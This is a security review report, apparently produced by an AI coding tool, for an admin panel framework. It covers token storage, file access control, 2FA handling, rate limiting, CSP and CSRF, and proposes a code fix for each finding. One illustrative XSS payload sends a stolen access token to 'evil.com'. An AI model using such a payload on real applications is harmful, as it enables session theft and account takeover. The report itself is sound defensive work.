# Security and Code Review Report

**Project**: js-admin-panel (Admin Panel Framework)
**Review Date**: 2025-12-16
**Reviewer**: Claude Code Security Audit
**Status**: CRITICAL ISSUES FOUND - DO NOT USE IN PRODUCTION UNTIL FIXED

---

## Executive Summary

This admin panel framework has **6 CRITICAL security vulnerabilities** that MUST be fixed before any production deployment. Additionally, there are **4 HIGH priority issues** and several medium/low priority improvements needed.

**Overall Security Grade: D (Needs Significant Work)**

---

## CRITICAL SECURITY ISSUES (Must Fix Before Production)

### 1. Access Token Stored in localStorage (XSS Vulnerability)

**Severity**: CRITICAL
**File**: `apps/web/src/stores/authStore.ts` (Lines 64-71)
**CVSS Score**: 8.1 (High)

**Issue**:
```typescript
persist(
  (set, get) => ({ ... }),
  {
    name: 'auth-storage',
    partialize: (state) => ({
      user: state.user,
      accessToken: state.accessToken,  // VULNERABLE!
      isAuthenticated: state.isAuthenticated,
    }),
  }
)
```

The access token is persisted to localStorage via Zustand's persist middleware. If ANY XSS vulnerability exists anywhere in the application (including third-party scripts, user-generated content, or dependencies), attackers can steal tokens with:

```javascript
// Attacker's XSS payload
fetch('https://evil.com/steal?token=' + JSON.parse(localStorage.getItem('auth-storage')).state.accessToken)
```

**Impact**: Complete account takeover, session hijacking, data theft

**Fix**:
```typescript
// Option 1: Don't persist access token (recommended)
partialize: (state) => ({
  user: state.user,
  // accessToken: state.accessToken,  // REMOVE THIS
  isAuthenticated: state.isAuthenticated,
}),

// Option 2: Use memory-only storage for tokens
// Store access token in a closure, not in state
```

**References**:
- OWASP: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#token-storage-on-client-side


### 2. Broken Access Control on File Operations

**Severity**: CRITICAL
**File**: `apps/api/src/modules/files/files.routes.ts` (Lines 176-264)
**CVSS Score**: 8.6 (High)

**Issue**:
```typescript
// GET /:id - No ownership check!
app.get('/:id', { preHandler: [app.authenticate] }, async (request, reply) => {
  const file = await filesService.getById(request.params.id);
  // Anyone can access ANY file if they know the ID
});

// DELETE /:id - No ownership check!
app.delete('/:id', { preHandler: [app.authenticate] }, async (request, reply) => {
  await filesService.delete(request.params.id);
  // Anyone can delete ANY file if they know the ID
});
```

**Impact**:
- Any authenticated user can download any file uploaded by any other user
- Any authenticated user can delete any file in the system
- Sensitive documents (contracts, personal data, financial records) exposed

**Fix**:
```typescript
// In files.service.ts
async getById(id: string, requestingUserId: string): Promise<FileWithUrl | null> {
  const file = await prisma.file.findUnique({
    where: {
      id,
      uploadedById: requestingUserId  // ADD OWNERSHIP CHECK
    },
  });
  // ...
}

// Or add admin override:
async getById(id: string, requestingUserId: string, isAdmin: boolean = false) {
  const where: Prisma.FileWhereUniqueInput = { id };
  if (!isAdmin) {
    where.uploadedById = requestingUserId;
  }
  // ...
}
```


### 3. 2FA Secret Stored in Plain Text

**Severity**: CRITICAL
**File**: `apps/api/src/modules/auth/auth.service.ts` (Line 514)
**CVSS Score**: 7.5 (High)

**Issue**:
```typescript
await prisma.user.update({
  where: { id: userId },
  data: {
    twoFactorEnabled: true,
    twoFactorSecret: secret,  // PLAIN TEXT!
  },
});
```

If the database is compromised (SQL injection, backup theft, insider threat), attackers get all 2FA secrets and can bypass 2FA for any account.

**Impact**: 2FA bypass, complete account takeover for all users

**Fix**:
```typescript
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto';

const ENCRYPTION_KEY = process.env.TWO_FACTOR_ENCRYPTION_KEY; // 32 bytes

function encrypt2FASecret(secret: string): string {
  const iv = randomBytes(16);
  const cipher = createCipheriv('aes-256-gcm', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
  const encrypted = Buffer.concat([cipher.update(secret, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return `${iv.toString('hex')}:${encrypted.toString('hex')}:${tag.toString('hex')}`;
}

function decrypt2FASecret(encryptedSecret: string): string {
  const [ivHex, encryptedHex, tagHex] = encryptedSecret.split(':');
  const decipher = createDecipheriv('aes-256-gcm', Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(ivHex, 'hex'));
  decipher.setAuthTag(Buffer.from(tagHex, 'hex'));
  return decipher.update(Buffer.from(encryptedHex, 'hex')) + decipher.final('utf8');
}
```


### 4. Incomplete 2FA Login Flow

**Severity**: CRITICAL
**File**: `apps/api/src/modules/auth/auth.service.ts` (Lines 104-109)
**CVSS Score**: 7.5 (High)

**Issue**:
```typescript
if (user.twoFactorEnabled) {
  const twoFactorToken = nanoid(32);
  await redis.setex(`2fa:${twoFactorToken}`, 300, user.id);
  throw new TwoFactorRequiredError();  // Token not returned to client!
}
```

The 2FA token is generated and stored in Redis, but it's NOT returned to the client. Users with 2FA enabled literally cannot log in.

**Impact**:
- Users with 2FA enabled are locked out of their accounts
- 2FA feature is completely broken

**Fix**:
```typescript
// In auth.service.ts
if (user.twoFactorEnabled) {
  const twoFactorToken = nanoid(32);
  await redis.setex(`2fa:${twoFactorToken}`, 300, user.id);
  return {
    requiresTwoFactor: true,
    twoFactorToken,  // Return to client
  };
}

// Add new endpoint: POST /api/auth/2fa/login
app.post('/2fa/login', async (request, reply) => {
  const { twoFactorToken, code } = request.body;
  const userId = await redis.get(`2fa:${twoFactorToken}`);
  if (!userId) throw new InvalidTokenError('2FA session expired');

  const user = await prisma.user.findUnique({ where: { id: userId } });
  const isValid = authenticator.verify({ token: code, secret: decrypt2FASecret(user.twoFactorSecret) });
  if (!isValid) throw new InvalidTokenError('Invalid 2FA code');

  // Complete login...
});
```


### 5. N+1 Query on Every Authenticated Request

**Severity**: CRITICAL (Performance/DoS)
**File**: `apps/api/src/plugins/auth.ts` (Lines 52-59)
**CVSS Score**: 7.5 (DoS)

**Issue**:
```typescript
app.decorate('requirePermission', (...requiredPermissions: string[]) => {
  return async (request, reply) => {
    // This runs on EVERY protected request
    const user = await prisma.user.findUnique({
      where: { id: request.user.sub },
      include: {
        role: { include: { permissions: true } },
      },
    });
    // ...
  };
});
```

Every single API request makes a database query with 2 JOINs. Under load:
- 100 requests/sec = 100 DB queries/sec just for auth
- Database becomes bottleneck
- Easy DoS target

**Impact**: Application becomes slow, potential DoS, high database load

**Fix** (Choose one):
```typescript
// Option 1: Include permissions in JWT (recommended for small permission sets)
const accessToken = this.app.jwt.sign({
  sub: userId,
  permissions: userPermissions,  // Add to token
}, { expiresIn: config.JWT_ACCESS_EXPIRY });

// Then in auth plugin:
app.decorate('requirePermission', (...required) => {
  return async (request) => {
    await request.jwtVerify();
    const hasAll = required.every(p => request.user.permissions.includes(p));
    if (!hasAll) throw new AuthorizationError();
  };
});

// Option 2: Redis cache with TTL
const cacheKey = `user:permissions:${userId}`;
let permissions = await redis.get(cacheKey);
if (!permissions) {
  const user = await prisma.user.findUnique({ ... });
  permissions = user.role.permissions.map(p => `${p.resource}:${p.action}`);
  await redis.setex(cacheKey, 300, JSON.stringify(permissions)); // 5 min cache
}
```


### 6. No Rate Limiting on Sensitive Auth Endpoints

**Severity**: HIGH
**File**: `apps/api/src/app.ts` (Lines 63-72)
**CVSS Score**: 6.5 (Medium-High)

**Issue**:
```typescript
await app.register(rateLimit, {
  max: 100,  // 100 requests per minute for EVERYTHING
  timeWindow: '1 minute',
});
```

Login, forgot-password, and reset-password endpoints use the same permissive rate limit as normal API endpoints. Attackers can:
- Brute force passwords at 100 attempts/minute
- Enumerate emails via forgot-password at 100 attempts/minute
- DoS the password reset system

**Impact**: Account takeover via brute force, email enumeration

**Fix**:
```typescript
// In auth.routes.ts
app.post('/login', {
  config: {
    rateLimit: {
      max: 5,
      timeWindow: '1 minute',
      keyGenerator: (req) => req.body?.email || req.ip,  // Rate limit per email
    },
  },
}, async (request, reply) => { ... });

app.post('/forgot-password', {
  config: {
    rateLimit: {
      max: 3,
      timeWindow: '1 minute',
      keyGenerator: (req) => req.ip,
    },
  },
}, async (request, reply) => { ... });
```

---

## HIGH PRIORITY ISSUES

### 7. Password Reset Email Not Implemented

**Severity**: HIGH
**File**: `apps/api/src/modules/auth/auth.service.ts` (Line 290)

```typescript
// TODO: Send email with reset link
logger.info({ userId: user.id }, 'Password reset token generated');
```

The forgot-password endpoint generates a token but doesn't send an email. Users cannot reset their passwords in production.

**Fix**: Implement email sending using the configured SendGrid integration.


### 8. Content Security Policy Disabled

**Severity**: HIGH
**File**: `apps/api/src/app.ts` (Line 48)

```typescript
await app.register(helmet, {
  contentSecurityPolicy: false,  // DISABLED!
});
```

CSP is a critical defense against XSS. With CSP disabled, XSS attacks are more likely to succeed.

**Fix**:
```typescript
await app.register(helmet, {
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
});
```


### 9. Missing CSRF Protection

**Severity**: HIGH

The application uses cookies for refresh tokens but has no CSRF protection. State-changing requests (POST, PUT, DELETE) are vulnerable to cross-site request forgery.

**Fix**: Implement double-submit cookie pattern or use `@fastify/csrf-protection`.


### 10. Soft Delete Not Filtering Deleted Users

**Severity**: MEDIUM-HIGH

Users have a `deletedAt` field for soft delete, but queries don't consistently filter deleted users. Deleted users may still appear in lists or be accessible.

**Fix**: Add `deletedAt: null` to all user queries, or use Prisma middleware for automatic filtering.

---

## MEDIUM PRIORITY ISSUES

### 11. User Serialization Code Duplication

8+ instances of duplicated user transformation code across auth.service.ts and users.service.ts. This violates DRY and makes maintenance difficult.

**Fix**: Create `serializeUser()` utility function.


### 12. Console.log in Production Code

Found in:
- `apps/web/src/pages/users/UsersPage.tsx` (Lines 156, 164, 199)
- `apps/web/src/pages/demos/FormDemo.tsx` (Line 101)

**Fix**: Remove or replace with proper logging.


### 13. File Type Validation Based Only on MIME Type

**File**: `apps/api/src/modules/files/files.service.ts` (Line 217)

The `isAllowedType` function only checks the MIME type from the request, not the actual file content. Attackers can upload malicious files with fake MIME types.

**Fix**: Use file magic number detection (e.g., `file-type` package) to verify actual file content.


### 14. Missing Input Sanitization

User inputs like firstName, lastName are stored without sanitization. Could lead to stored XSS if displayed without proper encoding.

**Fix**: Sanitize inputs before storage or ensure proper output encoding.

---

## LOW PRIORITY ISSUES

### 15. Zero Test Coverage

No tests exist in the codebase. For a reusable framework, this is concerning.

**Fix**: Implement the testing strategy in `documentation/testing-strategy.md`.


### 16. Missing OpenAPI Schemas

Swagger documentation exists but routes don't have proper schemas defined.

**Fix**: Add JSON Schema definitions to all routes.


### 17. Audit Log Could Grow Unbounded

AuditLog table has no archival or cleanup strategy.

**Fix**: Implement log rotation or archival policy.

---

## Checklist for Production Readiness

- [ ] Fix access token localStorage storage (CRITICAL)
- [ ] Add file ownership checks (CRITICAL)
- [ ] Encrypt 2FA secrets (CRITICAL)
- [ ] Complete 2FA login flow (CRITICAL)
- [ ] Add permission caching (CRITICAL)
- [ ] Add stricter auth rate limiting (CRITICAL)
- [ ] Implement password reset emails (HIGH)
- [ ] Enable and configure CSP (HIGH)
- [ ] Add CSRF protection (HIGH)
- [ ] Filter soft-deleted users (HIGH)
- [ ] Create user serialization utility (MEDIUM)
- [ ] Remove console.log statements (MEDIUM)
- [ ] Add file magic number validation (MEDIUM)
- [ ] Sanitize user inputs (MEDIUM)
- [ ] Add unit and integration tests (LOW)
- [ ] Complete API documentation (LOW)
- [ ] Implement audit log rotation (LOW)

---

## Recommendations

1. **Do not deploy to production** until all CRITICAL issues are fixed
2. **Conduct penetration testing** after fixes are implemented
3. **Add security headers** review (X-Frame-Options, X-Content-Type-Options, etc.)
4. **Implement security monitoring** (failed login alerts, suspicious activity detection)
5. **Regular dependency audits** using `npm audit` or Snyk
6. **Consider using HttpOnly cookies** for access tokens instead of localStorage

---

## Version History

| Date | Version | Changes |
|------|---------|---------|
| 2025-12-16 | 1.0 | Initial security review |
